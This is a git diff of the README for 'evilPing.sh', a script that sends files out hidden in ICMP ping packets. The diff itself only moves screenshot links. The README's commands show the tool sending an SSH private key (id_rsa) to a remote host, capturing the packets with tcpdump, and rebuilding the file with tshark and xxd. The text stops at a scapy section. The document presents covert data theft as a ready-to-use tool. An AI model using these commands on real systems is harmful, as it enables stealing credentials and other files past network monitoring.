@@ -3,10 +3,6 @@ Sending file through ICMP packet using PING
 
 This tools will convert the data into hexadecimal and send through ICMP packet in each block. if the connection not stable or any packet failed to send, the script will retry sending the failed data first before go to the next block data
 
-![Running](img/test.png)
-![Listen](img/listen.png)
-![Result](img/result.png)
-
 ### Usage
 ```
 Usage: ./evilPing.sh <file> <host>
@@ -15,16 +11,19 @@ Example
 ```
 ./evilPing.sh id_rsa 192.168.1.2
 ```
+![Running](img/test.png)
 
 ### Listening server for receiving ICMP packet using TCPdump
 ```
 sudo tcpdump -i any -s 0 'icmp' -w evilPing-received.pcap
 ```
+![Listen](img/listen.png)
 
 ### Extract data with tshark
 ```
 tshark -r evilPing-received.pcap -T fields -e data -Y ip.src==192.168.56.1 -Y icmp.type==8 | tail -n +2 | cut -c 17-48 | xxd -r -p
 ```
+![Result](img/result.png)
 
 ### Extract data with scapy
 ```
